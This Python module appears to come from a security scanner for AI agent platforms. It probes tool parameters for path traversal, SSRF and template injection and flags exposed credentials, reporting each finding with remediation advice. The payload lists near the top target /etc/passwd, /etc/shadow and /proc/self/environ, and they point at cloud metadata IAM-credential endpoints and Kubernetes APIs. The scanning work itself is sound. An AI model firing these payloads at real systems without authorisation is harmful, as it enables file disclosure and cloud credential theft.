"""ASI02 — Tool Misuse & Exploitation: path traversal and SSRF via tool parameters."""
from __future__ import annotations

from .base import BaseModule
from ..core.models import AgentSurface, Finding, OWASPCategory, Severity
from ..platforms.base import BasePlatform

_PATH_TRAVERSAL_PAYLOADS = [
    # Unix classic
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    # Unix soft targets (always readable)
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    # Absolute paths
    "/etc/passwd",
    "/etc/hosts",
    # URL-encoded (bypass naive sanitizers)
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Double URL-encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Windows
    r"C:\Windows\win.ini",
    r"..\..\..\Windows\win.ini",
]
_PATH_TRAVERSAL_INDICATORS = [
    "root:", "daemon:", "[extensions]", "[fonts]", "nobody:",
    "localhost", "127.0.0.1",  # /etc/hosts
    "PATH=", "HOME=",           # /proc/self/environ
]

_SSRF_PAYLOADS = [
    # AWS IMDS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure IMDS
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Loopback
    "http://127.0.0.1:22",
    # IPv6 loopback
    "http://[::1]:22/",
    # Kubernetes API server
    "http://10.96.0.1",
    "http://10.96.0.1:443",
    "http://kubernetes.default.svc",
    "http://kubernetes.default.svc.cluster.local",
    "http://10.96.0.1:8443",
]
_SSRF_CONFIRMED_INDICATORS = [
    "ami-id", "instance-id", "ssh-", "OpenSSH", "iam/",
    "computeMetadata", "azureMetadata", "osProfile",
    # Kubernetes API server responses
    "apiVersion", "kubernetes", "\"kind\":", "Unauthorized",
]

_SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
]
_SSTI_INDICATORS = ["49", "[object Object]", "RuntimeError"]

# Fields in tool schemas that accept path or URL inputs
_PATH_FIELDS = {"path", "filepath", "file", "filename", "dir", "directory"}
_URL_FIELDS  = {"url", "endpoint", "uri", "webhook", "target"}

# Credential fields that should not have non-empty values exposed
_CRED_FIELDS = {"apiKey", "apikey", "api_key", "token", "password", "secret", "credential", "key"}

# Generic probe endpoints — used when surface has no tools
_GENERIC_ENDPOINTS = [
    "/api/v1/tools/execute",
    "/api/v1/node-load-method/calculator",
]


def _is_api_response(r) -> bool:
    """Return False if response is HTML (SPA catch-all), True for JSON/API responses."""
    try:
        ct = r.headers.get("content-type", "")
        if isinstance(ct, str):
            return "text/html" not in ct
    except Exception:
        pass
    return True


def _tool_name(tool: dict) -> str:
    return tool.get("name") or tool.get("id") or "unknown"


def _schema_fields(tool: dict) -> set[str]:
    """Extract field names from tool inputParams or schema.properties."""
    fields: set[str] = set()
    params = tool.get("inputParams") or []
    if isinstance(params, list):
        for p in params:
            if isinstance(p, dict) and p.get("name"):
                fields.add(p["name"].lower())
    props = (tool.get("schema") or {}).get("properties") or {}
    if isinstance(props, dict):
        fields.update(k.lower() for k in props)
    return fields


_QDRANT_SSRF_ENDPOINT = "/collections/condor-probe/snapshots/recover"
_QDRANT_SSRF_PAYLOAD  = {"location": "http://169.254.169.254/latest/meta-data/"}


class ToolMisuseModule(BaseModule):
    name        = "tool-misuse"
    owasp_id    = OWASPCategory.ASI02
    description = "Tests for path traversal and SSRF via tool parameters, and detects exposed credentials (ASI02)"

    async def _check_qdrant_ssrf(self, platform: BasePlatform) -> list[Finding]:
        """Probe Qdrant snapshot recovery endpoint for SSRF without authentication."""
        findings: list[Finding] = []
        try:
            r = await platform.post(_QDRANT_SSRF_ENDPOINT, json=_QDRANT_SSRF_PAYLOAD)
            if r.status_code in (401, 403, 404, 405):
                return findings
            body = r.text
            if not _is_api_response(r):
                return findings
            ssrf_confirmed = any(ind in body for ind in _SSRF_CONFIRMED_INDICATORS)
            if r.status_code in (200, 201) and ssrf_confirmed:
                findings.append(Finding(
                    title="SSRF via Qdrant snapshot recovery: metadata fetched",
                    severity=Severity.CRITICAL,
                    owasp_id=self.owasp_id,
                    description=(
                        "Qdrant's POST /collections/{name}/snapshots/recover endpoint fetched "
                        "a cloud metadata URL without authentication, confirming SSRF. "
                        "An attacker can reach internal services and harvest IAM credentials."
                    ),
                    evidence=f"POST {_QDRANT_SSRF_ENDPOINT} → {r.status_code}; metadata in response: {body[:200]}",
                    remediation=(
                        "Enable Qdrant API key authentication (--api-key / QDRANT__SERVICE__API_KEY). "
                        "Restrict outbound network access from the Qdrant host."
                    ),
                    confidence=95,
                    cwe_id="CWE-918",
                    endpoint=_QDRANT_SSRF_ENDPOINT,
                ))
            elif r.status_code not in (200, 201) or not ssrf_confirmed:
                findings.append(Finding(
                    title="Qdrant snapshot recovery endpoint accessible without authentication",
                    severity=Severity.HIGH,
                    owasp_id=self.owasp_id,
                    description=(
                        "Qdrant's snapshot recovery endpoint accepted an unauthenticated request "
                        f"(HTTP {r.status_code}). The endpoint allows specifying arbitrary URLs "
                        "for snapshot fetching, creating a potential SSRF surface against internal "
                        "services. Metadata confirmation requires manual verification."
                    ),
                    evidence=f"POST {_QDRANT_SSRF_ENDPOINT} with SSRF URL → {r.status_code} (auth not enforced)",
                    remediation=(
                        "Enable Qdrant API key authentication. "
                        "Restrict outbound network access from the Qdrant host."
                    ),
                    confidence=70,
                    cwe_id="CWE-918",
                    endpoint=_QDRANT_SSRF_ENDPOINT,
                ))
        except Exception:
            pass
        return findings

    async def run(self, surface: AgentSurface, platform: BasePlatform) -> list[Finding]:
        findings: list[Finding] = []

        # --- 3. Tool enumeration exposure (runs regardless of auth) ---
        for tool in surface.tools:
            tool_name = _tool_name(tool)

            # Source code exposure
            func_code = tool.get("func") or tool.get("function") or ""
            if func_code and len(str(func_code)) > 20:
                findings.append(Finding(
                    title=f"Tool source code exposed: {tool_name}",
                    severity=Severity.HIGH,
                    owasp_id=self.owasp_id,
                    description=(
                        f"The tool '{tool_name}' exposes its source code in the tool registry. "
                        f"An attacker can read business logic, discover hardcoded secrets, "
                        f"or craft targeted exploits against the tool's implementation."
                    ),
                    evidence=f"Tool '{tool_name}' has 'func' field with {len(str(func_code))} chars of code.",
                    remediation="Do not expose tool source code via the API. Return only metadata.",
                    confidence=90,
                    cwe_id="CWE-200",
                    endpoint="/api/v1/tools",
                ))

            # Credential exposure in tool config
            for field in _CRED_FIELDS:
                val = tool.get(field) or (tool.get("config") or {}).get(field) or ""
                if val and isinstance(val, str) and len(val) > 3:
                    findings.append(Finding(
                        title=f"Credential exposed in tool configuration: {tool_name}.{field}",
                        severity=Severity.CRITICAL,
                        owasp_id=self.owasp_id,
                        description=(
                            f"The tool '{tool_name}' exposes a non-empty '{field}' field in its "
                            f"configuration via the unauthenticated tool registry. "
                            f"An attacker can harvest API keys or secrets without authentication."
                        ),
                        evidence=f"Tool '{tool_name}' field '{field}' = '{val[:8]}...' (truncated)",
                        remediation=(
                            "Never return credential fields in API responses. "
                            "Mask or omit sensitive fields before serialization."
                        ),
                        confidence=95,
                        cwe_id="CWE-312",
                        endpoint="/api/v1/tools",
                    ))

        # --- 1 & 2. Path traversal and SSRF via tool invocation (cap at 5 tools) ---
        for tool in surface.tools[:5]:
            tool_name = _tool_name(tool)
            fields = _schema_fields(tool)

            # Path traversal
            if fields & _PATH_FIELDS:
                endpoint = f"/api/v1/node-load-method/{tool_name}"
                for payload in _PATH_TRAVERSAL_PAYLOADS:
                    try:
                        r = await platform.post(endpoint, json={"filePath": payload, "path": payload})
                        if r.status_code == 200:
                            body = r.text
                            confirmed = any(ind in body for ind in _PATH_TRAVERSAL_INDICATORS)
                            if confirmed:
                                findings.append(Finding(
                                    title=f"Path traversal via tool parameter: {tool_name}",
                                    severity=Severity.CRITICAL,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' accepts a file path parameter and "
                                        f"returned OS file content when given a traversal payload. "
                                        f"An attacker can read arbitrary files from the server."
                                    ),
                                    evidence=f"POST {endpoint} with path='{payload}' → OS file content in response: {body[:200]}",
                                    remediation=(
                                        "Validate and sanitize all file path inputs. "
                                        "Use an allowlist of permitted directories. "
                                        "Run the tool execution process with minimal filesystem permissions."
                                    ),
                                    confidence=95,
                                    cwe_id="CWE-22",
                                    endpoint=endpoint,
                                ))
                                break
                    except Exception:
                        pass

            # SSTI via any tool parameter field
            if fields:
                endpoint = f"/api/v1/node-load-method/{tool_name}"
                for payload in _SSTI_PAYLOADS:
                    try:
                        r = await platform.post(endpoint, json={
                            "input": payload, "expression": payload,
                            "value": payload, "text": payload,
                        })
                        if r.status_code == 200:
                            body = r.text
                            hit = next((ind for ind in _SSTI_INDICATORS if ind in body), None)
                            if hit == "49" and len(body) > 500:
                                hit = None
                            if hit:
                                findings.append(Finding(
                                    title=f"SSTI in Tool Parameter: {tool_name}",
                                    severity=Severity.HIGH,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' evaluated a server-side template "
                                        f"expression injected via its parameter fields. "
                                        f"An attacker may escalate to full RCE depending on the "
                                        f"template engine and sandbox configuration."
                                    ),
                                    evidence=f"POST {endpoint} with payload='{payload}' → indicator '{hit}' in response: {body[:200]}",
                                    remediation=(
                                        "Treat all user-supplied input as data, never as template code. "
                                        "Use sandboxed template engines or disable expression evaluation entirely."
                                    ),
                                    confidence=70,
                                    cwe_id="CWE-94",
                                    endpoint=endpoint,
                                ))
                                break
                    except Exception:
                        pass

            # SSRF via URL parameter
            if fields & _URL_FIELDS:
                endpoint = f"/api/v1/node-load-method/{tool_name}"
                for ssrf_url in _SSRF_PAYLOADS:
                    try:
                        r = await platform.post(endpoint, json={"url": ssrf_url, "endpoint": ssrf_url})
                        if r.status_code == 200:
                            body = r.text
                            confirmed = any(ind in body for ind in _SSRF_CONFIRMED_INDICATORS)
                            if confirmed:
                                findings.append(Finding(
                                    title=f"SSRF via tool URL parameter: {tool_name}",
                                    severity=Severity.CRITICAL,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' fetched an SSRF payload URL and "
                                        f"returned cloud metadata in its response. "
                                        f"An attacker can access instance metadata, internal services, "
                                        f"or IAM credentials."
                                    ),
                                    evidence=f"POST {endpoint} with url='{ssrf_url}' → metadata in response: {body[:200]}",
                                    remediation=(
                                        "Validate all URL inputs against an allowlist of permitted hosts. "
                                        "Block requests to RFC-1918 and link-local address ranges. "
                                        "Use a dedicated egress proxy with SSRF protections."
                                    ),
                                    confidence=95,
                                    cwe_id="CWE-918",
                                    endpoint=endpoint,
                                ))
                                break
                            elif len(body) > 10:
                                findings.append(Finding(
                                    title=f"Potential SSRF — tool accepts arbitrary URLs: {tool_name}",
                                    severity=Severity.MEDIUM,
                                    owasp_id=self.owasp_id,
                                    description=(
                                        f"The tool '{tool_name}' returned a non-empty response when "
                                        f"given an SSRF payload URL. Full exploitation requires manual verification."
                                    ),
                                    evidence=f"POST {endpoint} with url='{ssrf_url}' → 200 OK, {len(body)} bytes",
                                    remediation=(
                                        "Validate and restrict outbound URL targets. "
                                        "Block requests to internal IP ranges."
                                    ),
                                    confidence=60,
                                    cwe_id="CWE-918",
                                    endpoint=endpoint,
                                ))
                                break
                    except Exception:
                        pass

        # --- 4. Qdrant SSRF via snapshot recovery endpoint ---
        findings.extend(await self._check_qdrant_ssrf(platform))

        # --- 5. Generic probe when no tools enumerated ---

        if not surface.tools:
            for endpoint in _GENERIC_ENDPOINTS:
                try:
                    r = await platform.post(endpoint, json={"name": "calculator", "input": "1+1", "expression": "1+1"})
                    body = r.text.strip()
                    # Require JSON API response with non-trivial content (not SPA HTML, not empty list/object)
                    if r.status_code == 200 and _is_api_response(r) and len(body) > 2:
                        findings.append(Finding(
                            title=f"Tool execution endpoint reachable without authentication: {endpoint}",
                            severity=Severity.LOW,
                            owasp_id=self.owasp_id,
                            description=(
                                f"The endpoint {endpoint} responded to an unauthenticated tool "
                                f"execution request. This may allow arbitrary tool invocation."
                            ),
                            evidence=f"POST {endpoint} → 200 OK ({len(body)} bytes)",
                            remediation="Require authentication on all tool execution endpoints.",
                            confidence=60,
                            cwe_id="CWE-306",
                            endpoint=endpoint,
                        ))
                except Exception:
                    pass

        return findings
